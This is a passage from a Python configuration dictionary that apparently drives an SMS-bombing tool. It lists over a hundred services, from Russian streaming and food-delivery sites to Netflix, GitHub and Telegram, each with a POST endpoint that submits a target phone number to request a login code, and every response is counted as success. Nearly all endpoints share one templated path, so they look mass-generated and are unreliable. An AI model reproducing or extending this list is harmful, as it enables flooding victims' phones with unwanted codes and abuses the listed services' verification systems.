        "headers": lambda: get_common_headers("https://maleza.ru/", "https://maleza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api837": {
        "name": "MalezaRu",
        "url": "https://maleza.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maleza.ru/", "https://maleza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api838": {
        "name": "MTS_TВ",
        "url": "https://tv.mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tv.mts.ru/", "https://tv.mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api839": {
        "name": "NTV_Plus",
        "url": "https://ntvplus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ntvplus.ru/", "https://ntvplus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api840": {
        "name": "TricolorTV",
        "url": "https://tricolor.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tricolor.tv/", "https://tricolor.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api841": {
        "name": "Megogo",
        "url": "https://megogo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megogo.ru/", "https://megogo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api842": {
        "name": "Ivi",
        "url": "https://ivi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ivi.ru/", "https://ivi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api843": {
        "name": "Okko",
        "url": "https://okko.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okko.tv/", "https://okko.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api844": {
        "name": "Kinopoisk",
        "url": "https://kinopoisk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kinopoisk.ru/", "https://kinopoisk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api845": {
        "name": "Wink",
        "url": "https://wink.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wink.ru/", "https://wink.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api846": {
        "name": "Kion",
        "url": "https://kion.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kion.ru/", "https://kion.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api847": {
        "name": "Premier",
        "url": "https://premier.one/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://premier.one/", "https://premier.one", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api848": {
        "name": "Start",
        "url": "https://start.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://start.ru/", "https://start.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api849": {
        "name": "MoreTv",
        "url": "https://more.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://more.tv/", "https://more.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api850": {
        "name": "Amediateka",
        "url": "https://amediateka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://amediateka.ru/", "https://amediateka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api851": {
        "name": "Netflix",
        "url": "https://netflix.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://netflix.com/", "https://netflix.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api852": {
        "name": "YouTube",
        "url": "https://youtube.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youtube.com/", "https://youtube.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api853": {
        "name": "Twitch",
        "url": "https://twitch.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://twitch.tv/", "https://twitch.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api854": {
        "name": "TikTok",
        "url": "https://tiktok.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tiktok.com/", "https://tiktok.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api855": {
        "name": "Instagram",
        "url": "https://instagram.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://instagram.com/", "https://instagram.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api856": {
        "name": "Facebook",
        "url": "https://facebook.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://facebook.com/", "https://facebook.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api857": {
        "name": "Twitter",
        "url": "https://twitter.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://twitter.com/", "https://twitter.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api858": {
        "name": "LinkedIn",
        "url": "https://linkedin.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://linkedin.com/", "https://linkedin.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api859": {
        "name": "Pinterest",
        "url": "https://pinterest.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pinterest.com/", "https://pinterest.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api860": {
        "name": "Reddit",
        "url": "https://reddit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://reddit.com/", "https://reddit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api861": {
        "name": "Tumblr",
        "url": "https://tumblr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tumblr.com/", "https://tumblr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api862": {
        "name": "Snapchat",
        "url": "https://snapchat.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://snapchat.com/", "https://snapchat.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api863": {
        "name": "Discord",
        "url": "https://discord.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://discord.com/", "https://discord.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api864": {
        "name": "Telegram",
        "url": "https://telegram.org/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://telegram.org/", "https://telegram.org", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api865": {
        "name": "WhatsApp",
        "url": "https://whatsapp.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://whatsapp.com/", "https://whatsapp.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api866": {
        "name": "Viber",
        "url": "https://viber.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://viber.com/", "https://viber.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api867": {
        "name": "Skype",
        "url": "https://skype.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skype.com/", "https://skype.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api868": {
        "name": "Zoom",
        "url": "https://zoom.us/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zoom.us/", "https://zoom.us", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api869": {
        "name": "MicrosoftTeams",
        "url": "https://teams.microsoft.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://teams.microsoft.com/", "https://teams.microsoft.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api870": {
        "name": "Slack",
        "url": "https://slack.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://slack.com/", "https://slack.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api871": {
        "name": "Trello",
        "url": "https://trello.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trello.com/", "https://trello.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api872": {
        "name": "Notion",
        "url": "https://notion.so/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://notion.so/", "https://notion.so", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api873": {
        "name": "Jira",
        "url": "https://atlassian.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://atlassian.com/", "https://atlassian.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api874": {
        "name": "Confluence",
        "url": "https://confluence.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://confluence.com/", "https://confluence.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api875": {
        "name": "GitHub",
        "url": "https://github.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://github.com/", "https://github.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api876": {
        "name": "GitLab",
        "url": "https://gitlab.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gitlab.com/", "https://gitlab.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api877": {
        "name": "Bitbucket",
        "url": "https://bitbucket.org/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitbucket.org/", "https://bitbucket.org", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api878": {
        "name": "StackOverflow",
        "url": "https://stackoverflow.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stackoverflow.com/", "https://stackoverflow.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api879": {
        "name": "Habr",
        "url": "https://habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://habr.com/", "https://habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api880": {
        "name": "Pikabu",
        "url": "https://pikabu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pikabu.ru/", "https://pikabu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api881": {
        "name": "Ircatalog",
        "url": "https://ircatalog.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ircatalog.ru/", "https://ircatalog.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api882": {
        "name": "VC_ru",
        "url": "https://vc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vc.ru/", "https://vc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api883": {
        "name": "DTF",
        "url": "https://dtf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dtf.ru/", "https://dtf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api884": {
        "name": "TJournal",
        "url": "https://tjournal.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tjournal.ru/", "https://tjournal.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api885": {
        "name": "SportsRu",
        "url": "https://sports.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sports.ru/", "https://sports.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api886": {
        "name": "Championat",
        "url": "https://championat.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://championat.com/", "https://championat.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api887": {
        "name": "Sovsport",
        "url": "https://sovsport.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovsport.ru/", "https://sovsport.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api888": {
        "name": "SportExpress",
        "url": "https://sport-express.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sport-express.ru/", "https://sport-express.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api889": {
        "name": "MatchTV",
        "url": "https://matchtv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://matchtv.ru/", "https://matchtv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api890": {
        "name": "Kinorium",
        "url": "https://kinorium.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kinorium.com/", "https://kinorium.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api891": {
        "name": "Film.ru",
        "url": "https://film.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://film.ru/", "https://film.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api892": {
        "name": "Kinoafisha",
        "url": "https://kinoafisha.info/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kinoafisha.info/", "https://kinoafisha.info", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api893": {
        "name": "RamblerKino",
        "url": "https://rambler.ru/kino/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rambler.ru/", "https://rambler.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api894": {
        "name": "YandexAfisha",
        "url": "https://afisha.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://afisha.yandex.ru/", "https://afisha.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api895": {
        "name": "Ticketland",
        "url": "https://ticketland.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ticketland.ru/", "https://ticketland.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api896": {
        "name": "KassirRu",
        "url": "https://kassir.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kassir.ru/", "https://kassir.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api897": {
        "name": "ConcertRu",
        "url": "https://concert.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://concert.ru/", "https://concert.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api898": {
        "name": "Redkassa",
        "url": "https://redkassa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://redkassa.ru/", "https://redkassa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api899": {
        "name": "MTS_Live",
        "url": "https://live.mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://live.mts.ru/", "https://live.mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api900": {
        "name": "Ponominalu",
        "url": "https://ponominalu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ponominalu.ru/", "https://ponominalu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api901": {
        "name": "Pyaterochka",
        "url": "https://5ka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://5ka.ru/", "https://5ka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api902": {
        "name": "Perekrestok",
        "url": "https://perekrestok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://perekrestok.ru/", "https://perekrestok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api903": {
        "name": "Magnit",
        "url": "https://magnit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnit.ru/", "https://magnit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api904": {
        "name": "Lenta",
        "url": "https://lenta.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api905": {
        "name": "Auchan",
        "url": "https://auchan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://auchan.ru/", "https://auchan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api906": {
        "name": "MetroCC",
        "url": "https://metro-cc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://metro-cc.ru/", "https://metro-cc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api907": {
        "name": "Dixy",
        "url": "https://dixy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dixy.ru/", "https://dixy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api908": {
        "name": "Billa",
        "url": "https://billa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://billa.ru/", "https://billa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api909": {
        "name": "VkusVill",
        "url": "https://vkusvill.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vkusvill.ru/", "https://vkusvill.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api910": {
        "name": "AzbukaVkusa",
        "url": "https://av.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://av.ru/", "https://av.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api911": {
        "name": "LentaOnline",
        "url": "https://lenta.com/online/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api912": {
        "name": "Utkonos",
        "url": "https://utkonos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utkonos.ru/", "https://utkonos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api913": {
        "name": "Samokat",
        "url": "https://samokat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://samokat.ru/", "https://samokat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api914": {
        "name": "YandexLavka",
        "url": "https://lavka.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lavka.yandex.ru/", "https://lavka.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api915": {
        "name": "DeliveryClub",
        "url": "https://delivery-club.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delivery-club.ru/", "https://delivery-club.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api916": {
        "name": "YandexEda",
        "url": "https://eda.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eda.yandex.ru/", "https://eda.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api917": {
        "name": "SberMarket",
        "url": "https://sbermarket.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbermarket.ru/", "https://sbermarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api918": {
        "name": "KFC",
        "url": "https://kfc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kfc.ru/", "https://kfc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api919": {
        "name": "Rostik",
        "url": "https://rostiks.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostiks.ru/", "https://rostiks.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api920": {
        "name": "BurgerKing",
        "url": "https://burgerking.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://burgerking.ru/", "https://burgerking.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api921": {
        "name": "VkusnoItochka",
        "url": "https://vkusnoitochka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vkusnoitochka.ru/", "https://vkusnoitochka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api922": {
        "name": "DodoPizza",
        "url": "https://dodopizza.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dodopizza.ru/", "https://dodopizza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api923": {
        "name": "DominosPizza",
        "url": "https://dominos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dominos.ru/", "https://dominos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api924": {
        "name": "PapaJohns",
        "url": "https://papajohns.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://papajohns.ru/", "https://papajohns.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api925": {
        "name": "Tanuki",
        "url": "https://tanuki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tanuki.ru/", "https://tanuki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api926": {
        "name": "Yakitoria",
        "url": "https://yakitoria.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yakitoria.ru/", "https://yakitoria.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api927": {
        "name": "Teremok",
        "url": "https://teremok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://teremok.ru/", "https://teremok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api928": {
        "name": "Shokoladnitsa",
        "url": "https://shoko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shoko.ru/", "https://shoko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api929": {
        "name": "CoffeeHouse",
        "url": "https://coffeehouse.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coffeehouse.ru/", "https://coffeehouse.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api930": {
        "name": "Dоdо",
        "url": "https://dodo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dodo.ru/", "https://dodo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api931": {
        "name": "Inmoloko",
        "url": "https://inmoloko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://inmoloko.ru/", "https://inmoloko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api932": {
        "name": "MamyM",
        "url": "https://mamym.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mamym.ru/", "https://mamym.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api933": {
        "name": "Chaihona",
        "url": "https://chaihona.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chaihona.ru/", "https://chaihona.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api934": {
        "name": "Ginzaproject",
        "url": "https://ginza.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ginza.ru/", "https://ginza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api935": {
        "name": "Rosinter",
        "url": "https://rosinter.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosinter.ru/", "https://rosinter.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api936": {
        "name": "NovikovGroup",
        "url": "https://novikovgroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novikovgroup.ru/", "https://novikovgroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api937": {
        "name": "WhiteRabbit",
        "url": "https://whiterabbit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://whiterabbit.ru/", "https://whiterabbit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api938": {
        "name": "McDonaldsRu",
        "url": "https://mcdonalds.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mcdonalds.ru/", "https://mcdonalds.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api939": {
        "name": "StarbucksRu",
        "url": "https://starbucks.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://starbucks.ru/", "https://starbucks.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api940": {
        "name": "SubwayRu",
        "url": "https://subway.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://subway.ru/", "https://subway.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api941": {
        "name": "PizzaHutRu",
        "url": "https://pizzahut.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pizzahut.ru/", "https://pizzahut.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api942": {
        "name": "BaskinRobbins",
        "url": "https://baskinrobbins.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://baskinrobbins.ru/", "https://baskinrobbins.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api943": {
        "name": "KFC_CIS",
        "url": "https://kfc.com/ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kfc.com/", "https://kfc.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api944": {
        "name": "Stardogs",
        "url": "https://stardogs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stardogs.ru/", "https://stardogs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api945": {
        "name": "KroshkaKartoshka",
        "url": "https://kartoshka.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kartoshka.com/", "https://kartoshka.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api946": {
        "name": "Wafers",
        "url": "https://wafers.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wafers.ru/", "https://wafers.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api947": {
        "name": "Prime",
        "url": "https://prime-star.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://prime-star.ru/", "https://prime-star.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api948": {
        "name": "Mumu",
        "url": "https://cafe-mumu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cafe-mumu.ru/", "https://cafe-mumu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api949": {
        "name": "Grabli",
        "url": "https://grabli.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://grabli.ru/", "https://grabli.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api950": {
        "name": "Oblomoff",
        "url": "https://oblomoff.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oblomoff.ru/", "https://oblomoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api951": {
        "name": "Yamadzhi",
        "url": "https://yamadzhi.ru/api/v1/auth/code",
